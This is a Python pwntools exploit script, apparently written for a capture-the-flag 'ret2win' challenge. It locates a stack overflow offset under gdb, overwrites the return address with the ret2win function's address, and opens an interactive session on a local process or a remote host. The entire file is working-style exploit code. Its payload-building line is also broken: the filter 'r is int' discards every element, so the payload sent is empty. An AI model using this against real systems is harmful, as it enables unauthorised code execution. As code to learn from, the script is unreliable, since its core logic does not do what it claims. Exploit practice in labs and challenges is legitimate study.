#!/bin/env python3

import argparse

from pwn import *

# PARSING
parser = argparse.ArgumentParser(
    prog="AK.py",
    description="AK some binary"
)

parser.add_argument("-t", "--target",
    help="choose the binary to target",
    type=str,
    required=True
)

parser.add_argument("-r", "--remote",
    help="should run localy or remotly",
    default=False,
    type=bool,
    required=False
)

parser.add_argument("-g", "--gdb",
    help="should run gdb with pwn tool",
    action="store_true",
    required=False
)

args = parser.parse_args()

if args.remote:
    parser.add_argument("-H", "--host",
        help="host for the remote connection",
        type=str,
        required=True
    )

    parser.add_argument("-p", "--port",
        help="port for the remote connection",
        type=int,
        required=True
    )

args = parser.parse_args()

ELF_LOADED = ELF(args.target)
ROP_LOADED = ROP(ELF_LOADED)
PAYLOAD = []

if ELF_LOADED.arch == "amd64":
    padding_movaps = 1
    offset_to_add = 4
    base_pointer = "rbp"
    pack_function = p64
else:
    padding_movaps = 0
    offset_to_add = 0
    base_pointer = "ebp"
    pack_function = p32

if args.remote:
    PROCESS = remote(args.host, args.port)
else:
    PROCESS = ELF_LOADED.process()
    if args.gdb:
        gdb.attach(PROCESS.pid, """
            c
            """, api=True)

def get_register_value(reg, cyclic_len):
    GDB_PROC = gdb.debug(args.target, "c", api=True)
    GDB_PROC.sendline(cyclic(cyclic_len))
    # sleep(1)
    reg_gdb = GDB_PROC.gdb.newest_frame().read_register(reg)
    value_str = binascii.unhexlify(str(hex(reg_gdb))[2:])
    log.info("rbp pattern : " + str(value_str))
    return cyclic_find(value_str) + offset_to_add + len(value_str) - 1

offset = get_register_value(base_pointer, 128)

log.info("potential offset : " + str(offset))
win_sym = ELF_LOADED.symbols[b'ret2win'] + padding_movaps

PAYLOAD.append(b'A' * offset)
PAYLOAD.append(win_sym)
PAYLOAD = b''.join([ pack_function(r) for r in PAYLOAD if r is int ])

log.info("payload: " + PAYLOAD.decode('latin1') + '\n')

PROCESS.sendline(PAYLOAD)

PROCESS.interactive()
